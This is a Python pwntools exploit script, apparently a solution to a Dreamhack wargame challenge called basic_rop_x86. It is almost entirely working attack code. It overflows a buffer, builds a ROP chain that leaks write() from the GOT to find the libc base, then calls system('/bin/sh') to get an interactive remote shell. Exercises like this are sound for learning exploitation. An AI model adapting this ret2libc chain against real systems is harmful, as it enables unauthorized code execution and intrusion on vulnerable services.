from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/basic_rop_x86')
    write_offset = 0xe57f0
    system_offset = 0x3cf10
    binsh_offset = 0x17b9db
else:
    r = remote('host1.dreamhack.games', 11769)
    write_offset = 0xd43c0
    system_offset = 0x3a940
    binsh_offset = 0x15902b

write_got = 0x804a024  # GOT of write()
write_plt = 0x8048450  # PLT of write()
pop3ret = 0x8048689  # pop esi; pop edi; pop ebp; ret
main = 0x80485d9  # main()


# leak libc
# write(1, write_got, 4)

payload = b'a' * 0x48  # dummy
payload += p32(write_plt)
payload += p32(pop3ret)
payload += p32(1)
payload += p32(write_got)
payload += p32(4)
payload += p32(main)  # return to main

r.send(payload)

r.recvuntil('a' * 0x40)
write = u32(r.recvn(4))  # write()
libc = write - write_offset  # libc base
system = libc + system_offset  # system()
binsh = libc + binsh_offset  # "/bin/sh"


# call system("/bin/sh")

payload = b'a' * 0x48  # dummy
payload += p32(system)
payload += b'a' * 4
payload += p32(binsh)

r.send(payload)


r.interactive()